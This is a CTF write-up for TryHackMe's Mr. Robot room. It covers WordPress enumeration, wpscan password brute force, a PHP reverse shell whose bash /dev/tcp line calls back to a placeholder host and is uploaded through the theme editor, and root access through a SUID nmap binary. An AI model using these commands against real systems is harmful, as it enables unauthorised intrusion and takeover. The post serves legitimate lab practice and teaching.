---
title: "TryHackMe: Mr Robot CTF Walkthrough"
date: "2026-03-01"
excerpt: "Full walkthrough of the Mr. Robot CTF room on TryHackMe — covering WordPress enumeration, privilege escalation via SUID binaries, and cracking MD5 hashes."
tags: ["tryhackme", "ctf", "writeup", "privilege-escalation"]
featured: true
---

# Mr. Robot CTF Walkthrough

> ⚠️ **Spoiler Warning** — This is a full walkthrough. Try the room first!

The Mr. Robot room on TryHackMe is a beginner-intermediate box themed around the TV show. It involves WordPress exploitation and Linux privilege escalation.

## Initial Enumeration

```bash
nmap -sV -sC -p- --min-rate=5000 10.10.xxx.xxx -oN nmap.txt
```

Open ports:
- **22** — SSH (filtered)
- **80** — HTTP (Apache/WordPress)
- **443** — HTTPS

## Web Enumeration

```bash
# Directory busting
gobuster dir -u http://10.10.xxx.xxx -w /usr/share/wordlists/dirb/common.txt -t 50

# Found:
# /wp-login
# /robots.txt   ← KEY FILE
# /wp-admin
```

Checking `/robots.txt`:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**Key 1 found!** Download the `fsocity.dic` wordlist for later.

## WordPress Attack

The login page at `/wp-login` is vulnerable to username enumeration:

```bash
# Enumerate valid username
wpscan --url http://10.10.xxx.xxx --enumerate u

# Result: user 'elliot' found
```

Brute force the password using fsocity.dic:

```bash
# Sort and deduplicate the wordlist first!
sort -u fsocity.dic > sorted.dic

wpscan --url http://10.10.xxx.xxx \
  -U elliot \
  -P sorted.dic \
  --password-attack xmlrpc
```

**Credentials found:** `elliot:ER28-0652`

## Getting a Shell

Once logged in, we can upload a PHP reverse shell via **Appearance → Theme Editor**:

```php
<?php
// PHP reverse shell
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'");
?>
```

Navigate to `http://target/wp-content/themes/twentyfifteen/404.php` and catch the shell:

```bash
nc -lvnp 4444
```

## Privilege Escalation

Check for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Found: `/usr/local/bin/nmap`

Old versions of nmap have an interactive mode!

```bash
nmap --interactive
nmap> !sh
# whoami → root
```

## Getting All Keys

```bash
# Key 2 (in /home/robot/)
cat /home/robot/key-2-of-3.txt

# Key 3 (as root)
cat /root/key-3-of-3.txt
```

## Lessons Learned

1. **Always check robots.txt** — it revealed the first key directly
2. **Sort wordlists** — reduces duplicates and speeds up brute force
3. **SUID binaries** — always check `find / -perm -u=s` for priv esc
4. **GTFOBins** — essential reference for SUID binary exploitation

Great beginner room to practice a full pentest methodology. 🤖
